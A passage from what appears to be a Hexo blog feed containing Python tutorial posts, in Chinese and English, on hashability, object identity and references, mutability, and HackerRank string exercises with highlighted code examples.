class="number">11</span>-fa63e6bfd44d&gt; <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">----&gt; <span class="number">1</span> test_set.add(&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;)</span><br><span class="line"></span><br><span class="line">TypeError: unhashable <span class="built_in">type</span>: <span class="string">&#x27;set&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="what-does-hashable-mean">What Does Hashable Mean</h2><p>Hashable: A characteristic of a Python object to indicate whether theobject has a hash value, which allows the object to serve as a key in adictionary or an element in a set.</p><p>Python 实现了内置的 hash 函数：<code>hash()</code>，来生成的对象的hash。例如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">13</span>]: <span class="built_in">hash</span>(<span class="string">&quot;Hello&quot;</span>)</span><br><span class="line">Out[<span class="number">13</span>]: <span class="number">4478279774205738605</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">14</span>]: <span class="built_in">hash</span>([<span class="number">1</span>,<span class="number">2</span>])</span><br><span class="line">-------------------------------------------------------------------</span><br><span class="line">TypeError                         Traceback (most recent call last)</span><br><span class="line">&lt;ipython-<span class="built_in">input</span>-<span class="number">14</span>-9ce67481a686&gt; <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">----&gt; <span class="number">1</span> <span class="built_in">hash</span>([<span class="number">1</span>,<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line">TypeError: unhashable <span class="built_in">type</span>: <span class="string">&#x27;list&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="customize-hashability">Customize Hashability</h2><p>By default, all instances of custom classes will have a hash valuedefined at creation and it will not change over time. Two instances ofthe same class will have two different hash values.</p><p>You will see that the hash value that you get from your objectschanges every time you run the code. <strong>This is because the hash isderived from the object's id</strong>. Python, as expected, allows youto define your own hash value.</p><p>By default, custom class instances are compared by comparing theiridentities using the built-in id() function. That's why two object withthe same attribute value isn't the same one from the set or dictionariesperspective.</p><p>结论： Dictionaries and set check two things: <strong>the hashvalue</strong>(The return value of <code>self.__hash__</code>) and<strong>the equality</strong>(<code>self.__eq__</code>)</p><p>实验：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name ,ssn</span>):</span><br><span class="line">        self.name = name</span><br><span class="line">        self.ssn = ssn</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__repr__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;name: <span class="subst">&#123;self.name&#125;</span>, ssn: <span class="subst">&#123;self.ssn&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__hash__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;__hash__ is called&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">hash</span>((self.name, self.ssn))</span><br><span class="line"></span><br><span class="line">p0 = Person(<span class="string">&quot;Jon Smith&quot;</span>, <span class="string">&quot;123456&quot;</span>)</span><br><span class="line">p1 = Person(<span class="string">&quot;Jon Smith&quot;</span>, <span class="string">&quot;123456&quot;</span>)</span><br><span class="line"></span><br><span class="line">persons = <span class="built_in">set</span>()</span><br><span class="line"></span><br><span class="line">persons.add(p0)</span><br><span class="line"><span class="built_in">print</span>(persons)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;-&quot;</span>*<span class="number">20</span>)</span><br><span class="line"></span><br><span class="line">persons.add(p1)</span><br><span class="line"><span class="built_in">print</span>(persons)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;-&quot;</span>*<span class="number">20</span>)</span><br></pre></td></tr></table></figure><p>无论有无 <code>__hash__()</code>时，结果都为：集合将两个相同属性值的对象看作是不同的对象。</p><p>从下面结果可以看出。 <code>set</code> 通过执行<code>__hash__()</code> 检查了对象的 hash</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># violetv at manjaro in ~/test [21:03:54]</span></span><br><span class="line">$ python hashable.py</span><br><span class="line">__hash__ <span class="keyword">is</span> called</span><br><span class="line">&#123;name: Jon Smith, ssn: <span class="number">123456</span>&#125;</span><br><span class="line">--------------------</span><br><span class="line">__hash__ <span class="keyword">is</span> called</span><br><span class="line">&#123;name: Jon Smith, ssn: <span class="number">123456</span>, name: Jon Smith, ssn: <span class="number">123456</span>&#125;</span><br><span class="line">--------------------</span><br></pre></td></tr></table></figure><p>当我们在上述代码的对象中添加了 <code>__eq__()</code>函数之后，我们可以看到了 set 已经将两个对象识别为一个了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">__eq__</span>(<span class="params">self, other</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;__eq__ is called&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">        self.__<span class="keyword">class</span> == other.__class__ <span class="keyword">and</span></span><br><span class="line">        self.name == other.name <span class="keyword">and</span></span><br><span class="line">        self.ssn == other.ssn</span><br><span class="line">    )</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ python hashable.py</span><br><span class="line">__hash__ <span class="keyword">is</span> called</span><br><span class="line">&#123;name: Jon Smith, ssn: <span class="number">123456</span>&#125;</span><br><span class="line">--------------------</span><br><span class="line">__hash__ <span class="keyword">is</span> called</span><br><span class="line">__eq__ <span class="keyword">is</span> called</span><br><span class="line">&#123;name: Jon Smith, ssn: <span class="number">123456</span>&#125;</span><br><span class="line">--------------------</span><br></pre></td></tr></table></figure><h2 id="参考资料">参考资料</h2><blockquote><p><ahref="https://www.pythonforthelab.com/blog/what-are-hashable-objects/">Whatare Hashable Objects</a> &gt; <ahref="https://stackoverflow.com/questions/56154702/what-the-difference-between-hash-able-and-immutable">Whatthe difference between hash-able and immutable</a> &gt; <ahref="https://medium.com/better-programming/3-essential-questions-about-hashable-in-python-33e981042bcb">3Essential Questions About Hashable in Python</a> &gt; <ahref="https://docs.python.org/3/glossary.html">Python Glossary</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python Object Reference</title>
      <link href="/blog/2020/03/21/programming/python/1.basic/14.obj_reference/"/>
      <url>/blog/2020/03/21/programming/python/1.basic/14.obj_reference/</url>
      
        <content type="html"><![CDATA[<h2 id="objects-identity-type-and-value">Objects: Identity, Type, andValue</h2><p>作为一门面向对象的编程语言，Python中的任何东西都是一个对象，包括内置数据类型（如：整型，字符串），函数，类，甚至模块。</p><p>但是，Python 中的对象到底是什么呢?简而言之，对象相当于数据容器，它形成人与计算机之间的接口。程序员通过写代码来直接操作这些容器，从而以激素那几可以理解的方式实现一定的功能。</p><ul><li><p>Identity对象是内存某个地方数据块。在大多数编程语言（包括：Python）中，我们使用这些数据块的内存地址来标识对象。也就是说，对象的内存地址表征一个对象的身份。在 CPython 实现中，内置函数 <code>id()</code>返回对象的内存地址。</p></li><li><p>Type 当对象被创建时，它的类型也在内存中被定义和设置了。从内存数据块的角度来说，当某个内存块被绑定到对象时，不仅仅它的标识符（身份）被创建了，而且他的类型(例如，整数，字符串)也被创建了。</p><p>python 中提供内置函数的 <code>type()</code>来判断对象的类型。</p></li><li><p>Value对象可以取的值由其类型决定。例如，如果一个对象的类型是整数，它就不能保存 dictionary 类型的数据，反之亦然。</p></li></ul><h2 id="why">WHY？</h2><p>首先，我们来看三段代码，并根据代码，尝试思考我提出的几个问题，如果你都能给出解答，那就不用看本文了，如果不理解，请继续往下看。</p><ol start="0" type="1"><li><p>分别创建两个具有相同值的对象与创建一个对象，然后采用赋值创建另一个对象有区别吗？即： 以下的 a, b c 一样吗？</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">3</span>]: a=[<span class="number">1</span>,<span class="number">2</span>]</span><br><span class="line">In [<span class="number">4</span>]: b=[<span class="number">1</span>,<span class="number">2</span>]</span><br><span class="line">In [<span class="number">5</span>]: c=a</span><br></pre></td></tr></table></figure></p><p>知识点： 对 Python 中变量，对象及对象引用的理解</p></li><li><p>分别创建两个具有相同值的对象，为什么对象的 <code>id</code>时而相同，时而不同？ 知识点： Python 内存管理</p></li><li><p>采用变量赋值的方式创建另一个对象情况下，为何有些数据类型，改变另一个对象的值之后，另一个对象的，id 仍然不变，有的 id 却变了？知识点: 对象可变性与对象引用</p></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">11</span>]: a=<span class="number">257</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">12</span>]: b=<span class="number">257</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">13</span>]: <span class="built_in">id</span>(a), <span class="built_in">id</span>(b)</span><br><span class="line">Out[<span class="number">13</span>]: (<span class="number">140448785920880</span>, <span class="number">140448785920656</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="number">14</span>]: a=<span class="number">256</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">15</span>]: b=<span class="number">256</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">16</span>]: <span class="built_in">id</span>(a), <span class="built_in">id</span>(b)</span><br><span class="line">Out[<span class="number">16</span>]: (<span class="number">140448908007520</span>, <span class="number">140448908007520</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## list 可变类型</span></span><br><span class="line">In [<span class="number">1</span>]: list_a = [<span class="number">1</span>,<span class="number">2</span>,<span class="string">&quot;hello&quot;</span>]</span><br><span class="line"></span><br><span class="line">In [<span class="number">2</span>]: list_b = [<span class="number">1</span>,<span class="number">2</span>,<span class="string">&quot;hello&quot;</span>]</span><br><span class="line"></span><br><span class="line">In [<span class="number">3</span>]: <span class="built_in">id</span>(list_a), <span class="built_in">id</span>(list_b)</span><br><span class="line">Out[<span class="number">3</span>]: (<span class="number">139867441284480</span>, <span class="number">139867441621120</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="number">4</span>]: list_c = list_a</span><br><span class="line"></span><br><span class="line">In [<span class="number">5</span>]: <span class="built_in">id</span>(list_a), <span class="built_in">id</span>(list_c)</span><br><span class="line">Out[<span class="number">5</span>]: (<span class="number">139867441284480</span>, <span class="number">139867441284480</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="number">6</span>]: list_c.append(<span class="string">&quot;World&quot;</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="number">7</span>]: <span class="built_in">id</span>(list_a), <span class="built_in">id</span>(list_c)</span><br><span class="line">Out[<span class="number">7</span>]: (<span class="number">139867441284480</span>, <span class="number">139867441284480</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="number">8</span>]: <span class="built_in">print</span>(<span class="string">f&quot;list_a: <span class="subst">&#123;list_a&#125;</span>\nlist_c: <span class="subst">&#123;list_c&#125;</span>&quot;</span>)</span><br><span class="line">list_a: [<span class="number">1</span>, <span class="number">2</span>, <span class="string">&#x27;hello&#x27;</span>, <span class="string">&#x27;World&#x27;</span>]</span><br><span class="line">list_c: [<span class="number">1</span>, <span class="number">2</span>, <span class="string">&#x27;hello&#x27;</span>, <span class="string">&#x27;World&#x27;</span>]</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># int 不可变类型</span></span><br><span class="line">In [<span class="number">9</span>]: int_a = <span class="number">3</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">10</span>]: int_b = <span class="number">3</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">11</span>]: <span class="built_in">id</span>(int_a), <span class="built_in">id</span>(int_b)</span><br><span class="line">Out[<span class="number">11</span>]: (<span class="number">139867496413376</span>, <span class="number">139867496413376</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="number">12</span>]: int_c = int_a</span><br><span class="line"></span><br><span class="line">In [<span class="number">13</span>]: <span class="built_in">id</span>(int_a), <span class="built_in">id</span>(int_c)</span><br><span class="line">Out[<span class="number">13</span>]: (<span class="number">139867496413376</span>, <span class="number">139867496413376</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="number">14</span>]: int_c = <span class="number">12</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">15</span>]: <span class="built_in">id</span>(int_a), <span class="built_in">id</span>(int_c)</span><br><span class="line">Out[<span class="number">15</span>]: (<span class="number">139867496413376</span>, <span class="number">139867496413664</span>)</span><br></pre></td></tr></table></figure><h2 id="memory-management">Memory Management</h2><p>每次一个新的对象创建，它便会有一个新的内存地址，除非当它是</p><ul><li>一个非常短的字符串</li><li>一个在 [-5，256] 之间的整型</li><li>一个空的不可变容器(例如: tuple))</li></ul><h3 id="示例">示例</h3><ol type="1"><li><p>新内存地址 我们创建一个 L1 列表，然后再创建一个新的列表 L2来引用和 L1 相同的值，那 L2 对应的对象将有一个新的内存。</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>L1 = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">id</span>(L1)</span><br><span class="line"><span class="number">3061530120</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>L2 = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">id</span>(L2)</span><br><span class="line"><span class="number">3061527304</span></span><br></pre></td></tr></table></figure></p></li><li><p>相同的内存地址</p><p>我们来看一个整型对象的例子， x 和 y 都引用对象 10。在之前的例子中 L1和 L2 内存地址不同，而 x 和 y 引用的对象共享相同的内存地址。</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>x = <span class="number">10</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>y = <span class="number">10</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">id</span>(x)</span><br><span class="line"><span class="number">2301840</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">id</span>(y)</span><br><span class="line"><span class="number">2301840</span></span><br></pre></td></tr></table></figure></p><p>这是因为，在这三个情况中，Python通过让第二个变量引用内存中相同的对象来优化内存，有的把它叫做 "sharedobject”</p></li></ol><h2 id="variables">Variables</h2><ul><li>变量和数据(对象)都是保存在内存中的</li><li>在 Python 中函数的参数传递以及返回值都是靠对象引用(object reference)传递的</li></ul><h3 id="variable-assignment">Variable Assignment</h3><blockquote><p>Assignment statements in Python do not copy objects, they createbindings between a target and an object.</p></blockquote><p>That means when we create a variable by assignment, the new variablerefers to the same object as the original variable does.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>A = [<span class="number">1</span>, <span class="number">2</span>, [<span class="number">10</span>, <span class="number">11</span>], <span class="number">3</span>, [<span class="number">20</span>, <span class="number">21</span>]]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>B = A</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">id</span>(A)</span><br><span class="line"><span class="number">3061527080</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">id</span>(B)</span><br><span class="line"><span class="number">3061527080</span></span><br></pre></td></tr></table></figure><p>Because the new variable B and the original variable A share the sameobject (i.e. the same list), they also contain same elements。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">id</span>(A[<span class="number">2</span>])</span><br><span class="line"><span class="number">3061527368</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">id</span>(B[<span class="number">2</span>])</span><br><span class="line"><span class="number">3061527368</span></span><br></pre></td></tr></table></figure><p>As illustrated in the figure below, A and B share the same id, i.e.,they refer to the same object in memory. And they contain the sameelements as well.</p><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20203201584671290252.png"alt="variable assigment" /><figcaption aria-hidden="true">variable assigment</figcaption></figure><h2 id="object-refernce">Object refernce</h2><p>The professor, Lynn Andrea Stein — an award-winning computer scienceeducator — made the point that <strong>the usual “variables as boxes”metaphor actually hinders the understanding of reference variables in OOlanguages.</strong></p><p>Python variables are like reference variables in Java, so it’s betterto think of them as <strong>labels attached to objects</strong>.</p><p>在 python 中</p><ul><li>变量和数据是分开存储的</li><li>数据保存在内存中的一个位置</li><li>变量中保存着数据在内存中的地址</li><li>变量中记录数据的地址，叫做引用</li><li>变量没有类型，类型属于对象，变量是对象的标识符或名字<code>num = 12</code>， num 只是一个名字，12 才是整型的对象</li><li>使用 <code>id()</code> 函数可以查看变量中保存数据所在的内存地址</li><li>Assignment statements in Python do not copy objects, they createbindings between a target and an object. That means when we create avariable by assignment, the new variable refers to the same object asthe original variable does</li><li>如果变量已经被定义，当给一个变量赋值时，本质上是修改了对象的引用，是让对象左边的变量标识右边的对象。<ul><li>变量不再对之前的对象引用</li><li>变量改为对新赋值的数据引用</li></ul></li></ul><p>示例：</p><p><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20203201584668728073.png" /></p><p>Python is “pass-by-object-reference”, of which it is often said:</p><blockquote><p>“Object references are passed by value.”</p></blockquote><h3 id="mutable-vs.-immutable-objects">mutable vs. immutableobjects</h3><ol type="1"><li><p>Immutable: objects whose value cannot change tuple，int, float,bool, string, complex</p><p>Immutable means that the object, the top-level container for theitem, cannot be changed. Note that this applies only to the top level;it may contain references to sub-objects that are mutable.</p><p>Tuples are not always immutable in Python, because tuples may holdreferences to mutable objects such as lists or dicts. A tuple is onlyimmutable if all of its items are immutable as well.</p></li><li><p>Mutable: objects whose value can change</p><ol type="1"><li>dict, list, set</li><li>User-defined objects (unless defined as immutable)</li><li>Mutable object define the operation what can be doen to them, suchas append, pop, remove, clear and so on.</li></ol></li></ol><p>This distinction matters because it explains seemingly contradictorybehavior</p><p>Notice</p><ol type="1"><li>The assign operation is meant to <strong>tag</strong> the variableto the object in the right of equal sign.(identifier of the object)</li><li>The mutable or immutable attribute of objects have nothing to dowith the reference or the relation between identifier and obejct, whichcan alway be changed by assigning action by us manually.</li></ol><h4 id="自定义函数实现-string-可变">自定义函数实现 string 可变</h4><p>hackerrank 有一道题目提供了些思路: <ahref="https://www.hackerrank.com/challenges/python-mutations/problem">hackerrankMutations</a></p><ol type="1"><li>One solution is to convert the string to a list and then change thevalue，finally, join it back.</li><li>Another approach is to slice the string and join it back.</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">replaceCharByIndex</span>(<span class="params">string, index, new</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Method 1: covert string to list -&gt; replace -&gt; join it back</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    test_list = <span class="built_in">list</span>(string)</span><br><span class="line">    test_list[index] = new</span><br><span class="line">    string = <span class="string">&quot;&quot;</span>.join(test_list)</span><br><span class="line">    <span class="built_in">print</span>(string)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">replacebyIndex</span>(<span class="params">string, index, new</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Method2: slice the string, then join it back</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    string = string[:index] + new + string[index+<span class="number">1</span>:]</span><br><span class="line">    <span class="built_in">print</span>(string)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">repalceStrbyIndex</span>(<span class="params">string, index, new</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Method 2 适用性更广，可以改造成在固定 index 开始替换,</span></span><br><span class="line"><span class="string">    来弥补 built-in function: repalce 只能根据旧的字串替换的功能</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    string = string[:index] + new + string[index+<span class="built_in">len</span>(new):]</span><br><span class="line">    <span class="built_in">print</span>(string)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    test_str = <span class="built_in">input</span>()</span><br><span class="line">    index, new = <span class="built_in">input</span>().split()</span><br><span class="line">    repalceStrbyIndex(test_str, <span class="built_in">int</span>(index), new)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h3 id="pass-by-object-reference">Pass by object reference</h3><ol type="1"><li><p>python 中一切皆对象，要想对对象进行改变，就要通过方法。</p></li><li><p>python 中对象的可变与不可变属性。 像可变对象，例如: list, dict 等python 定义了改变他们的方法，比如:<code>append、pop、remove、clear</code> 等,而对于不可变对象，如：number，string，tuple 等对象，python并没有改变他们的方法。</p><p>写到这里，突然发现我可以分清楚:用的方法是直接改变原对象，还是返回改变后的值了。对于不可变对象来说，不可能直接改变原对象。例如: string 虽然 python 提供了诸如 title，capitalize，upper等方法，但那也只是拷贝一份修改，返回而已，不能够不直接改变原对象(因为它是不可变的)</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">24</span>]: test.upper()</span><br><span class="line">Out[<span class="number">24</span>]: <span class="string">&#x27;HELLO&#x27;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">25</span>]: test</span><br><span class="line">Out[<span class="number">25</span>]: <span class="string">&#x27;hello&#x27;</span></span><br></pre></td></tr></table></figure></p><p>而像列表这种，提供的 sort 等方法就是直接改变原对象。</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">28</span>]: lis = [<span class="number">2</span>,<span class="number">9</span>,<span class="number">1</span>,<span class="number">0</span>]</span><br><span class="line">In [<span class="number">29</span>]: lis</span><br><span class="line">Out[<span class="number">30</span>]: [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">9</span>]</span><br></pre></td></tr></table></figure></p></li></ol><p>而 C++ 中的整数，浮点数，数组并不是对象, 即使是 string，array等对象，也没有可变不可变的概念(当然事实上他们是可变的).</p><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20203201584672425098.png"alt="string_c++" /><figcaption aria-hidden="true">string_c++</figcaption></figure><p>导致了 Python 引用出现与 c++ 引用不一致的情况。</p><p>最终，Python的参数传递，也和变量赋值一样顺理成章的使用了对象引用（pass-by-object-reference），即传递的是一个对象的内存地址。</p><h2 id="funciton-reference">Funciton reference</h2><p>具体的资料没找到, 我是从 hackrank 的一道题目的讨论区中学到的，不过从C/C++ 过来的我，感觉也挺容易理解的。</p><p><ahref="https://www.hackerrank.com/challenges/string-validators/problem">StringValidators</a></p><p>知识点:</p><ol type="1"><li>function reference</li><li>any 函数 (拓展: all 函数) -- 此知识点见 function usage那篇笔记。</li></ol><p>在不会这两点之前，我的 writeup 是这样的:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">validators</span>(<span class="params">string</span>):</span><br><span class="line">    validator_list = [<span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">False</span>] <span class="comment"># 5 个长度的list 代表 5 种类型</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> string:</span><br><span class="line">        <span class="keyword">if</span> char.isalnum():</span><br><span class="line">            validator_list[<span class="number">0</span>] = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">if</span> char.isalpha():</span><br><span class="line">            validator_list[<span class="number">1</span>] = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">if</span> char.isdigit():</span><br><span class="line">            validator_list[<span class="number">2</span>] = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">if</span> char.islower():</span><br><span class="line">            validator_list[<span class="number">3</span>] = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">if</span> char.isupper():</span><br><span class="line">            validator_list[<span class="number">4</span>] = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> validator_list</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    validated_results = validators(<span class="built_in">input</span>())</span><br><span class="line">    [<span class="built_in">print</span>(i, sep=<span class="string">&quot;\n&quot;</span>) <span class="keyword">for</span> i <span class="keyword">in</span> validated_results]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span 